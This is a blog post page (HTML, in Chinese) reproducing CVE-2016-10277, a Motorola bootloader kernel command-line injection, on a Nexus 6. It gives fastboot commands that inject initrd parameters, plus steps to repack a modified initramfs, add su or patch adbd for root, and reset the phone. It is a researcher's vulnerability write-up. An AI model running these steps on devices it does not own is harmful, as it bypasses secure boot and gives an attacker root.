@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="Author: geneblue Blog: https:&#x2F;&#x2F;geneblue.github.io&#x2F; 系统环境 123Nexus 6 MRA58KAndroid 6.0Linux version 3.10.40-ge42477a (android-build@wpds13.hot.corp.google.com) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Tu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2016-10277 Moto bootloader initroot">
+<meta property="og:url" content="http://yoursite.com/2017/06/30/android/vul--android-moto-bootloader-initroot-cve201610277/index.html">
+<meta property="og:site_name" content="geneblue&#39;s blog">
+<meta property="og:description" content="Author: geneblue Blog: https:&#x2F;&#x2F;geneblue.github.io&#x2F; 系统环境 123Nexus 6 MRA58KAndroid 6.0Linux version 3.10.40-ge42477a (android-build@wpds13.hot.corp.google.com) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Tu">
+<meta property="og:locale">
+<meta property="article:published_time" content="2017-06-30T04:02:08.000Z">
+<meta property="article:modified_time" content="2022-01-16T15:49:52.429Z">
+<meta property="article:author" content="geneblue">
+<meta property="article:tag" content="vulnerability">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2017/06/30/android/vul--android-moto-bootloader-initroot-cve201610277/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>CVE-2016-10277 Moto bootloader initroot | geneblue's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">geneblue's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">The quiter you become,the more you are able to hear!</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/android/vul--android-moto-bootloader-initroot-cve201610277/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="geneblue">
+      <meta itemprop="description" content="Personal Blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="geneblue's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          CVE-2016-10277 Moto bootloader initroot
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-06-30 12:02:08" itemprop="dateCreated datePublished" datetime="2017-06-30T12:02:08+08:00">2017-06-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-01-16 23:49:52" itemprop="dateModified" datetime="2022-01-16T23:49:52+08:00">2022-01-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>Author: geneblue</strong> <strong>Blog:
+https://geneblue.github.io/</strong></p>
+<h3 id="系统环境">系统环境</h3>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Nexus</span> <span class="number">6</span> MRA<span class="number">58</span>K</span><br><span class="line"><span class="attribute">Android</span> <span class="number">6</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Linux</span> version <span class="number">3</span>.<span class="number">10</span>.<span class="number">40</span>-ge<span class="number">42477</span>a (android-build@wpds<span class="number">13</span>.hot.corp.google.com) (gcc version <span class="number">4</span>.<span class="number">8</span> (GCC) ) #<span class="number">1</span> SMP PREEMPT Tue Aug <span class="number">25</span> <span class="number">17</span>:<span class="number">17</span>:<span class="number">25</span> UTC <span class="number">2015</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h3 id="验证漏洞">验证漏洞</h3>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem config fsg-id <span class="string">&quot;a androidboot.bar=1&quot;</span></span><br><span class="line">fastoot <span class="keyword">continue</span></span><br><span class="line">adb <span class="keyword">shell</span> getprop ro.<span class="keyword">boot</span>.bar</span><br></pre></td></tr></table></figure>
+<p><code>ro.boot.bar</code> 更改为1，说明漏洞存在。</p>
+<p>看了其他几款手机，huawei,xiaomi,nubia,neuxs5,vivo, <code>fastboot oem
+config</code> 命令都不可用，看来只有摩托罗拉的手机才有这个问题。</p>
+<h3 id="逆向-aboot">逆向 ABOOT</h3>
+<p>从 bootloader.img 中提取 ABOOT，可以使用 <a
+target="_blank" rel="noopener" href="https://github.com/laginimaineb/unpack_motoboot">unpack_motoboot</a>
+脚本。</p>
+<p>参考文章里的 aboot 带了符号表，所以可以很轻松找到
+<code>target_get_scratch_address()</code> 函数的返回值。 但我提取出来的
+aboot 没有符号表,只有逆向着看了。</p>
+<p>先将 <a
+target="_blank" rel="noopener" href="https://github.com/Surge1223/ida-mbn-sbl-loader">ida-mbn-sbl-loader</a>
+放入 <code>IDA loader</code> 中，方便 IDA 解析 aboot。</p>
+<p>然后下载 <a
+href="git%20clone%20https://android.googlesource.com/kernel/lk">LK</a>
+代码对照着看。首先需要搜索 <code>target_get_scratch_address()</code>
+都在哪些地方被调用了，之后可以试着搜索周边的字符串。</p>
+<p>因为这个 aboot 和 <code>Android LK</code>
+源码并不是一致的，所以很多字符串并不对应，所以要多尝试着找一些字符串，找了一会儿，找到了
+<code>aboot_init()</code> 中调用
+<code>target_get_scratch_address()</code> 的位置：</p>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">...</span></span><br><span class="line">partition_dump();</span><br><span class="line">fastboot_init(target_get_scratch_address(), sz);</span><br><span class="line">udc_start();</span><br><span class="line"><span class="meta">...</span></span><br></pre></td></tr></table></figure>
+<p><code>fastboot_init()</code> 中有个 <code>"fastboot_init()\n"</code>
+字符串，恰好逆向的 aboot 中也存在, 所以可以很快确定
+<code>fastboot_init()</code> 函数，之后就能确定
+<code>target_get_scratch_address()</code>。
+有时会找不到字符串引用的位置，主要是 IDA
+分析代码时，没有做好交叉引用关系，直接在汇编码中表达成了字符串地址值，可以写个脚本批处理这种情况，临时性的方法，可以先将汇编码导出成
+asm
+文件，在文件中搜索字符串的地址值，之后就可以确定引用字符串的函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">target_get_scratch_address</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x11000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="伪造-initramfs">伪造 initramfs</h3>
+<p>对于有的 Moto 设备，在 flash
+时需要添加一个<code>padding</code>做填充，漏洞作者猜测，在 <code>flash
+image</code>后，手机启动过程可能污染了发送的<code>initramfs</code>，导致<code>initramfs</code>被破坏。因此，需要将<code>initramfs</code>放在一个高地址内存处。</p>
+<p>padding 32 MB</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27;*(32*1024*1024-1)&quot;</span> &gt; initramfs_padding</span><br><span class="line"><span class="keyword">cat</span> <span class="keyword">boot</span>.img-ramdisk.gz &gt;&gt; initramfs_padding</span><br><span class="line">fastboot oem config fsg-id <span class="string">&quot;a initrd=0x13000000,1822041&quot;</span></span><br><span class="line">fastboot flash aleph initramfs_padding</span><br><span class="line">fastboot <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>对于 nexus6 设备，不需要加 padding</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem config fsg-<span class="built_in">id</span> <span class="string">&quot;a initrd=0x11000000,1125383&quot;</span></span><br><span class="line">fastboot flash aleph boot.img-ramdisk.gz</span><br><span class="line">fastboot <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>1125383 为 <code>boot.img-ramdisk.gz</code>
+文件大小，刷入原镜像，手机启动成功。</p>
+<p>initramfs 镜像是由 cpio 打包，再经 gzip
+压缩的一个压缩文件，伪造的方法就是先将 initramfs 镜像使用 gunzip
+解压缩，再用 cpio 解包，修改解包出来的文件再打包压缩。相关命令如下:</p>
+<p>解压解包:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp boot<span class="selector-class">.img-ramdisk</span><span class="selector-class">.gz</span> tmp_ramdisk<span class="selector-class">.gz</span></span><br><span class="line">gunzip tmp_ramdisk<span class="selector-class">.gz</span></span><br><span class="line">mkdir cpio_out &amp;&amp; cd cpio_out</span><br><span class="line">cpio -<span class="selector-tag">i</span> -F ../tmp_ramdisk</span><br></pre></td></tr></table></figure>
+<p>打包压缩:</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> cpio_out</span><br><span class="line"><span class="keyword">find</span> . | <span class="keyword">grep</span> -v [.]$ | cpio -R roo<span class="variable">t:root</span> -<span class="keyword">o</span> -H newc | gzip &gt; ../new_ramdisk.cpio.gz</span><br></pre></td></tr></table></figure>
+<p>压缩的 <code>new_ramdisk.cpio.gz</code> 比原镜像文件要大，对应更改
+fastboot 参数，刷入手机重启成功。之前，由于 cpio
+打包命令错误，导致手机一直在重启状态循环。</p>
+<p>gzip 的压缩比是可以更改的，更改 gzip 压缩比，-1
+最快，但是压缩比最差，-9 最慢，但是压缩比最好！预设是 -6。</p>
+<p>如果要添加 root 权限，我们可以直接向 initramfs 中添加 su 文件，或者
+patch adbd，让其降权不成功，直接以 root 权限启动。</p>
+<h5 id="添加-su">添加 su</h5>
+<p>将su,拷贝到根目录,再重新打包后,启动成功</p>
+<h5 id="patch-adbd">patch adbd</h5>
+<p>adbd 是个后台守护进程，由 init 进程启动，启动之初具备 root
+权限，init.rc 中有段脚本可以表明。 为了不让 adb shell 以 root
+权限执行，adbd 源码中有一段降权代码，将该代码 patch 掉， 在执行 adb
+shell 时就可以获取 root 权限。</p>
+<p>代码位置 <code>syste/core/adb/adb_main.cpp</code></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> adb<span class="constructor">_main(<span class="params">int</span> <span class="params">is_daemon</span>, <span class="params">int</span> <span class="params">server_port</span>)</span></span><br><span class="line">&#123;<span class="operator"></span></span><br><span class="line"><span class="operator"></span></span><br><span class="line"><span class="operator">    ...</span></span><br><span class="line"><span class="operator"></span></span><br><span class="line"><span class="operator">    </span><span class="keyword">if</span> (should<span class="constructor">_drop_privileges()</span>) &#123;</span><br><span class="line">        drop<span class="constructor">_capabilities_bounding_set_if_needed()</span>;<span class="operator"></span></span><br><span class="line"><span class="operator">    </span></span><br><span class="line"><span class="operator">    ...</span></span><br><span class="line"><span class="operator"></span></span><br><span class="line"><span class="operator"></span>&#125;</span><br></pre></td></tr></table></figure>
+<p>initramfs 中包含的文件都比较重要，能 patch 的目标也是比较多的，如
+init.rc，sepolicy，甚至 init
+进程，所以这个漏洞的攻击面还是比较广的。</p>
+<h5 id="需要注意的问题">需要注意的问题</h5>
+<p>伪造是一次性的，伪造成功后，重启手机，手机循环启动，无法进入系统，这是为什么？？？</p>
+<p>这需要重新将 initramfs 恢复到原始内存位置，再重启手机， 参见 <a
+target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3917.html">【漏洞分析】如何通过内核命令注入绕过Nexus
+6的安全启动模式（含演示视频）</a> 物理内存布局。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem config fsg-<span class="built_in">id</span> <span class="string">&quot;a initrd=0x02000000,1125383&quot;</span></span><br><span class="line">fastboot <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>这样重启时，手机可以重启，没有问题，当我重新向手机刷入
+Android7.1(原系统是6.0)时，手机重启时又陷入了无限重启状态。</p>
+<p>通过与漏洞作者的沟通，恢复手机原状要执行 fastboot 命令。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot oem config fsg-<span class="built_in">id</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="总结">总结</h3>
+<p>该漏洞只影响 Moto 系列的手机，主要是 bootloader
+出的问题，做针对性的攻击是可行，伪造 initramfs 的攻击面比较广。</p>
+<h3 id="参考">参考</h3>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="http://www.freebuf.com/articles/terminal/137995.html">CVE-2016-10277在MOTO
+X手机上的漏洞利用实践</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://alephsecurity.com/2017/05/23/nexus6-initroot/">initroot:
+Bypassing Nexus 6 Secure Boot through Kernel Command-line
+Injection</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://github.com/alephsecurity/initroot">initroot</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnerability/" rel="tag"># vulnerability</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2017/05/10/android/sec--android-pagemap/" rel="next" title="pagemap 解析">
+                  <i class="fa fa-chevron-left"></i> pagemap 解析
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2017/08/23/android/sec--android8.0-kernel-hardening/" rel="prev" title="Android 8.0 内核安全特性">
+                  Android 8.0 内核安全特性 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">系统环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">验证漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91-aboot"><span class="nav-number">3.</span> <span class="nav-text">逆向 ABOOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-initramfs"><span class="nav-number">4.</span> <span class="nav-text">伪造 initramfs</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0-su"><span class="nav-number">4.0.1.</span> <span class="nav-text">添加 su</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#patch-adbd"><span class="nav-number">4.0.2.</span> <span class="nav-text">patch adbd</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">4.0.3.</span> <span class="nav-text">需要注意的问题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="geneblue"
+    src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">geneblue</p>
+  <div class="site-description" itemprop="description">Personal Blog</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/GeneBlue" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;GeneBlue" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:geneblue.mail@gmail.com" title="E-Mail &amp;rarr; mailto:geneblue.mail@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">geneblue</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
